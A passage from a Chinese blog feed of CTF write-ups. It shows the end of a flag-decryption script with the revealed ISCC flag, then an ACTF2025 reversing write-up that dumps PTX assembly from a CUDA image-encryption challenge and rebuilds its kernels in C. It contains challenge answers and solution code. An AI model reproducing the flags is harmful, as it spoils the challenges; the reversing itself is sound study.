class="number">0x86</span>, <span class="number">0x1b</span>, <span class="number">0x87</span>, <span class="number">0x2f</span>, <span class="number">0x31</span>, <span class="number">0x6b</span>, <span class="number">0xbc</span>, <span class="number">0xfa</span>, <span class="number">0x5b</span>, <span class="number">0x9a</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x8b</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x6c</span>, <span class="number">0x1d</span>, <span class="number">0x94</span>, <span class="number">0xba</span>, <span class="number">0x2f</span>, <span class="number">0x37</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> AesKey[<span class="number">16</span>]&#123; <span class="number">0x54</span>,<span class="number">0x8E</span>,<span class="number">0x7A</span>,<span class="number">0x3A</span>,<span class="number">0x13</span>,<span class="number">0x57</span>,<span class="number">0xF3</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x3A</span>,<span class="number">0x00</span>,<span class="number">0x7A</span>,<span class="number">0x00</span>,<span class="number">0x8E</span>,<span class="number">0x00</span>,<span class="number">0x54</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> Flag[<span class="number">48</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">EncFlag[i] ^= <span class="number">0x10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i+=<span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">aesDecrypt</span>(AesKey, <span class="number">16</span>, EncFlag + i, Flag + i, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.48s\n&quot;</span>, Flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密得到Flag：</p><p><strong>ISCC{A35_128_51pH4sh_2-4_CTF_K3y3d_H4sh}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这题当时赛中很早就写出爆破解密脚本了，但是一直没爆出来，赛后和出题人咨询发现是密文错了，并且发现其实是程序本身出错了，xor 0x10的代码</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2025 Reverse Deeptx WP</title>
    <link href="https://tkazer.github.io/2025/04/27/ACTF-Deeptx/"/>
    <id>https://tkazer.github.io/2025/04/27/ACTF-Deeptx/</id>
    <published>2025-04-27T12:22:12.000Z</published>
    <updated>2025-04-27T12:56:34.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ACTF2025-Reverse-Deeptx-WP"><a href="#ACTF2025-Reverse-Deeptx-WP" class="headerlink" title="ACTF2025 Reverse Deeptx WP"></a>ACTF2025 Reverse Deeptx WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是和aliyunctf一样的Cuda图片解密题，不过这次第一层加密上了运动模糊卷积加密，导致图片解密到这一层没法再解密了，只能利用运动模糊还原算法来让图片尽可能清晰。这题因为Cuda的Sync卡了一天，没注意到Layer3加密中的几个Sync汇编，导致加密还原完全正确，但加密执行的流程错了。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序载入ida看到是cuda代码相关，这边复制了sbox、tbox、motion三个数组数据到device，读入了flag.bmp并跳过前面的bmp格式数据，载入了0x10000大小的数据，即256*256，进行了三次Layer加密计算，最后输出到图片。</p><p><img src="/2025/04/27/ACTF-Deeptx/image.png" alt="alt text"></p><p>直接用cuobjdump进行dump出ptx汇编代码。</p><p><img src="/2025/04/27/ACTF-Deeptx/image-1.png" alt="alt text"></p><p>ptx汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line">Fatbin elf code:</span><br><span class="line">================</span><br><span class="line">arch = sm_86</span><br><span class="line">code version = [1,7]</span><br><span class="line">host = linux</span><br><span class="line">compile_size = 64bit</span><br><span class="line"></span><br><span class="line">Fatbin elf code:</span><br><span class="line">================</span><br><span class="line">arch = sm_86</span><br><span class="line">code version = [1,7]</span><br><span class="line">host = linux</span><br><span class="line">compile_size = 64bit</span><br><span class="line"></span><br><span class="line">Fatbin ptx code:</span><br><span class="line">================</span><br><span class="line">arch = sm_86</span><br><span class="line">code version = [8,7]</span><br><span class="line">host = linux</span><br><span class="line">compile_size = 64bit</span><br><span class="line">compressed</span><br><span class="line">ptxasOptions =</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">.version 8.7</span><br><span class="line">.target sm_86</span><br><span class="line">.address_size 64</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">.const .align 1 .b8 cuda_sbox[256];</span><br><span class="line">.const .align 1 .b8 cuda_tbox[256];</span><br><span class="line">.const .align 4 .b8 cuda_motion[1024];</span><br><span class="line"></span><br><span class="line">.visible .entry _Z6Layer1PhS_(</span><br><span class="line">.param .u64 _Z6Layer1PhS__param_0,</span><br><span class="line">.param .u64 _Z6Layer1PhS__param_1</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">.reg .pred %p&lt;6&gt;;</span><br><span class="line">.reg .b16 %rs&lt;2&gt;;</span><br><span class="line">.reg .f32 %f&lt;12&gt;;</span><br><span class="line">.reg .b32 %r&lt;23&gt;;</span><br><span class="line">.reg .b64 %rd&lt;15&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ld.param.u64 %rd5, [_Z6Layer1PhS__param_0];</span><br><span class="line">ld.param.u64 %rd6, [_Z6Layer1PhS__param_1];</span><br><span class="line">mov.u32 %r1, %tid.x;</span><br><span class="line">setp.lt.u32 %p1, %r1, 241;</span><br><span class="line">mov.u32 %r2, %ctaid.x;</span><br><span class="line">setp.lt.u32 %p2, %r2, 241;</span><br><span class="line">and.pred %p3, %p1, %p2;</span><br><span class="line">@%p3 bra $L__BB0_2;</span><br><span class="line">bra.uni $L__BB0_1;</span><br><span class="line"></span><br><span class="line">$L__BB0_2:</span><br><span class="line">mov.u32 %r3, %ntid.x;</span><br><span class="line">cvta.to.global.u64 %rd1, %rd5;</span><br><span class="line">mov.f32 %f10, 0f00000000;</span><br><span class="line">mov.u32 %r11, 0;</span><br><span class="line">mov.u64 %rd8, cuda_motion;</span><br><span class="line">mov.u32 %r20, %r11;</span><br><span class="line"></span><br><span class="line">$L__BB0_3:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">add.s32 %r13, %r20, %r2;</span><br><span class="line">shl.b32 %r14, %r20, 4;</span><br><span class="line">mov.u32 %r15, 240;</span><br><span class="line">sub.s32 %r16, %r15, %r14;</span><br><span class="line">mad.lo.s32 %r21, %r13, %r3, %r1;</span><br><span class="line">mul.wide.u32 %rd7, %r16, 4;</span><br><span class="line">add.s64 %rd14, %rd8, %rd7;</span><br><span class="line">mov.u32 %r22, %r11;</span><br><span class="line"></span><br><span class="line">$L__BB0_4:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">cvt.u64.u32 %rd9, %r21;</span><br><span class="line">add.s64 %rd10, %rd1, %rd9;</span><br><span class="line">ld.global.u8 %rs1, [%rd10];</span><br><span class="line">cvt.rn.f32.u16 %f7, %rs1;</span><br><span class="line">ld.const.f32 %f8, [%rd14];</span><br><span class="line">fma.rn.f32 %f10, %f8, %f7, %f10;</span><br><span class="line">add.s32 %r21, %r21, 1;</span><br><span class="line">add.s64 %rd14, %rd14, 4;</span><br><span class="line">add.s32 %r22, %r22, 1;</span><br><span class="line">setp.ne.s32 %p4, %r22, 16;</span><br><span class="line">@%p4 bra $L__BB0_4;</span><br><span class="line"></span><br><span class="line">add.s32 %r20, %r20, 1;</span><br><span class="line">setp.lt.u32 %p5, %r20, 16;</span><br><span class="line">@%p5 bra $L__BB0_3;</span><br><span class="line">bra.uni $L__BB0_6;</span><br><span class="line"></span><br><span class="line">$L__BB0_1:</span><br><span class="line">mov.f32 %f10, 0f00000000;</span><br><span class="line"></span><br><span class="line">$L__BB0_6:</span><br><span class="line">cvt.rzi.u32.f32 %r17, %f10;</span><br><span class="line">mov.u32 %r18, %ntid.x;</span><br><span class="line">mad.lo.s32 %r19, %r2, %r18, %r1;</span><br><span class="line">cvt.u64.u32 %rd11, %r19;</span><br><span class="line">cvta.to.global.u64 %rd12, %rd6;</span><br><span class="line">add.s64 %rd13, %rd12, %rd11;</span><br><span class="line">st.global.u8 [%rd13], %r17;</span><br><span class="line">ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">.visible .entry _Z6Layer2PhS_(</span><br><span class="line">.param .u64 _Z6Layer2PhS__param_0,</span><br><span class="line">.param .u64 _Z6Layer2PhS__param_1</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">.reg .b16 %rs&lt;2&gt;;</span><br><span class="line">.reg .b32 %r&lt;8&gt;;</span><br><span class="line">.reg .b64 %rd&lt;14&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ld.param.u64 %rd1, [_Z6Layer2PhS__param_0];</span><br><span class="line">ld.param.u64 %rd2, [_Z6Layer2PhS__param_1];</span><br><span class="line">cvta.to.global.u64 %rd3, %rd2;</span><br><span class="line">cvta.to.global.u64 %rd4, %rd1;</span><br><span class="line">mov.u32 %r1, %ctaid.x;</span><br><span class="line">mov.u32 %r2, %ntid.x;</span><br><span class="line">mov.u32 %r3, %tid.x;</span><br><span class="line">mad.lo.s32 %r4, %r1, %r2, %r3;</span><br><span class="line">cvt.u64.u32 %rd5, %r4;</span><br><span class="line">add.s64 %rd6, %rd4, %rd5;</span><br><span class="line">ld.global.u8 %rs1, [%rd6];</span><br><span class="line">cvt.u64.u32 %rd7, %r3;</span><br><span class="line">mov.u64 %rd8, cuda_sbox;</span><br><span class="line">add.s64 %rd9, %rd8, %rd7;</span><br><span class="line">ld.const.u8 %r5, [%rd9];</span><br><span class="line">cvt.u64.u32 %rd10, %r1;</span><br><span class="line">add.s64 %rd11, %rd8, %rd10;</span><br><span class="line">ld.const.u8 %r6, [%rd11];</span><br><span class="line">mad.lo.s32 %r7, %r2, %r5, %r6;</span><br><span class="line">cvt.u64.u32 %rd12, %r7;</span><br><span class="line">add.s64 %rd13, %rd3, %rd12;</span><br><span class="line">st.global.u8 [%rd13], %rs1;</span><br><span class="line">ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">.visible .entry _Z6Layer3PhS_(</span><br><span class="line">.param .u64 _Z6Layer3PhS__param_0,</span><br><span class="line">.param .u64 _Z6Layer3PhS__param_1</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">.reg .pred %p&lt;5&gt;;</span><br><span class="line">.reg .b16 %rs&lt;33&gt;;</span><br><span class="line">.reg .b32 %r&lt;52&gt;;</span><br><span class="line">.reg .b64 %rd&lt;24&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ld.param.u64 %rd6, [_Z6Layer3PhS__param_0];</span><br><span class="line">ld.param.u64 %rd5, [_Z6Layer3PhS__param_1];</span><br><span class="line">mov.u32 %r21, %ntid.x;</span><br><span class="line">mov.u32 %r1, %ctaid.x;</span><br><span class="line">mul.lo.s32 %r49, %r1, %r21;</span><br><span class="line">mov.u32 %r3, %tid.x;</span><br><span class="line">add.s32 %r22, %r49, %r3;</span><br><span class="line">cvt.u64.u32 %rd1, %r22;</span><br><span class="line">cvta.to.global.u64 %rd2, %rd6;</span><br><span class="line">add.s64 %rd3, %rd2, %rd1;</span><br><span class="line">cvt.u16.u32 %rs8, %r3;</span><br><span class="line">cvt.u16.u32 %rs9, %r1;</span><br><span class="line">or.b16 %rs10, %rs9, %rs8;</span><br><span class="line">ld.global.u8 %rs11, [%rd3];</span><br><span class="line">xor.b16 %rs12, %rs11, %rs10;</span><br><span class="line">st.global.u8 [%rd3], %rs12;</span><br><span class="line">bar.sync 0;</span><br><span class="line">and.b32 %r23, %r3, 7;</span><br><span class="line">setp.ne.s32 %p1, %r23, 0;</span><br><span class="line">@%p1 bra $L__BB2_4;</span><br><span class="line"></span><br><span class="line">ld.global.u32 %r47, [%rd3+4];</span><br><span class="line">ld.global.u32 %r48, [%rd3];</span><br><span class="line">mov.u32 %r46, 1786956040;</span><br><span class="line">mov.u32 %r45, 0;</span><br><span class="line"></span><br><span class="line">$L__BB2_2:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">shl.b32 %r26, %r48, 4;</span><br><span class="line">add.s32 %r27, %r26, 1386807340;</span><br><span class="line">shr.u32 %r28, %r48, 5;</span><br><span class="line">add.s32 %r29, %r28, 2007053320;</span><br><span class="line">xor.b32 %r30, %r29, %r27;</span><br><span class="line">add.s32 %r31, %r48, %r46;</span><br><span class="line">xor.b32 %r32, %r30, %r31;</span><br><span class="line">add.s32 %r47, %r32, %r47;</span><br><span class="line">shl.b32 %r33, %r47, 4;</span><br><span class="line">add.s32 %r34, %r33, 621668851;</span><br><span class="line">add.s32 %r35, %r46, %r47;</span><br><span class="line">xor.b32 %r36, %r34, %r35;</span><br><span class="line">shr.u32 %r37, %r47, 5;</span><br><span class="line">add.s32 %r38, %r37, -862448841;</span><br><span class="line">xor.b32 %r39, %r36, %r38;</span><br><span class="line">sub.s32 %r48, %r48, %r39;</span><br><span class="line">add.s32 %r46, %r46, -1708609273;</span><br><span class="line">add.s32 %r45, %r45, 1;</span><br><span class="line">setp.ne.s32 %p2, %r45, 3238567;</span><br><span class="line">@%p2 bra $L__BB2_2;</span><br><span class="line"></span><br><span class="line">st.global.u32 [%rd3], %r48;</span><br><span class="line">st.global.u32 [%rd3+4], %r47;</span><br><span class="line"></span><br><span class="line">$L__BB2_4:</span><br><span class="line">bar.sync 0;</span><br><span class="line">and.b16 %rs16, %rs9, %rs8;</span><br><span class="line">ld.global.u8 %rs17, [%rd3];</span><br><span class="line">xor.b16 %rs18, %rs17, %rs16;</span><br><span class="line">st.global.u8 [%rd3], %rs18;</span><br><span class="line">bar.sync 0;</span><br><span class="line">cvt.u64.u32 %rd7, %r3;</span><br><span class="line">mov.u64 %rd8, cuda_sbox;</span><br><span class="line">add.s64 %rd9, %rd8, %rd7;</span><br><span class="line">ld.const.u8 %rs31, [%rd9];</span><br><span class="line">cvta.to.global.u64 %rd4, %rd5;</span><br><span class="line">mov.u16 %rs32, 0;</span><br><span class="line">mov.u32 %r50, 0;</span><br><span class="line">mov.u64 %rd14, cuda_tbox;</span><br><span class="line"></span><br><span class="line">$L__BB2_5:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">cvt.u64.u32 %rd10, %r49;</span><br><span class="line">add.s64 %rd11, %rd2, %rd10;</span><br><span class="line">cvt.u64.u16 %rd12, %rs31;</span><br><span class="line">and.b64 %rd13, %rd12, 255;</span><br><span class="line">add.s64 %rd15, %rd14, %rd13;</span><br><span class="line">ld.const.u8 %rs19, [%rd15];</span><br><span class="line">ld.global.u8 %rs20, [%rd11];</span><br><span class="line">mul.lo.s16 %rs21, %rs19, %rs20;</span><br><span class="line">add.s16 %rs32, %rs21, %rs32;</span><br><span class="line">mul.lo.s16 %rs22, %rs31, 5;</span><br><span class="line">add.s16 %rs31, %rs22, 17;</span><br><span class="line">add.s32 %r49, %r49, 1;</span><br><span class="line">add.s32 %r50, %r50, 1;</span><br><span class="line">setp.ne.s32 %p3, %r50, 256;</span><br><span class="line">@%p3 bra $L__BB2_5;</span><br><span class="line"></span><br><span class="line">xor.b32 %r18, %r1, %r3;</span><br><span class="line">mov.u32 %r51, 8;</span><br><span class="line"></span><br><span class="line">$L__BB2_7:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">shl.b16 %rs23, %rs32, 3;</span><br><span class="line">and.b16 %rs24, %rs32, 224;</span><br><span class="line">shr.u16 %rs25, %rs24, 5;</span><br><span class="line">or.b16 %rs26, %rs25, %rs23;</span><br><span class="line">cvt.u32.u16 %r42, %rs26;</span><br><span class="line">mad.lo.s32 %r43, %r42, 13, %r18;</span><br><span class="line">and.b32 %r44, %r51, 255;</span><br><span class="line">cvt.u64.u32 %rd16, %r44;</span><br><span class="line">add.s64 %rd18, %rd14, %rd16;</span><br><span class="line">cvt.u16.u32 %rs27, %r43;</span><br><span class="line">ld.const.u8 %rs28, [%rd18];</span><br><span class="line">xor.b16 %rs29, %rs28, %rs27;</span><br><span class="line">cvt.u64.u16 %rd19, %rs29;</span><br><span class="line">and.b64 %rd20, %rd19, 255;</span><br><span class="line">add.s64 %rd22, %rd8, %rd20;</span><br><span class="line">ld.const.u8 %rs32, [%rd22];</span><br><span class="line">add.s32 %r51, %r51, 1;</span><br><span class="line">setp.ne.s32 %p4, %r51, 4137823;</span><br><span class="line">@%p4 bra $L__BB2_7;</span><br><span class="line"></span><br><span class="line">add.s64 %rd23, %rd4, %rd1;</span><br><span class="line">st.global.u8 [%rd23], %rs32;</span><br><span class="line">ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按ptx汇编逐行还原三个layer加密函数。</p><p>bar.sync 0;这几行汇编很重要，会让所有gpu线程都同步执行到这边才继续往下进行加密。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cuda_runtime.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;device_launch_parameters.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_sbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_tbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">float</span> cuda_motion[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Layer1</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (tid &gt;= <span class="number">241</span> || bid &gt;= <span class="number">241</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> sum = <span class="number">0.f</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> Index = (i + bid) * bdim + (tid + j);</span><br><span class="line">            sum += cuda_motion[<span class="number">240</span> - (i * <span class="number">16</span>) + j] * (<span class="type">float</span>)(Input[Index]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Output[bid * bdim + tid] = (<span class="type">uint8_t</span>)(sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Layer2</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Value = Input[bid * bdim + tid];</span><br><span class="line">    <span class="type">int</span> Index = bdim * cuda_sbox[tid] + cuda_sbox[bid];</span><br><span class="line">    Output[Index] = Value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Layer3</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> CurIndex = bdim * bid + tid;</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= tid | bid;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((CurIndex &amp; <span class="number">7</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v0 = *(<span class="type">uint32_t</span>*)(Input + CurIndex);</span><br><span class="line">        <span class="type">uint32_t</span> v1 = *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span 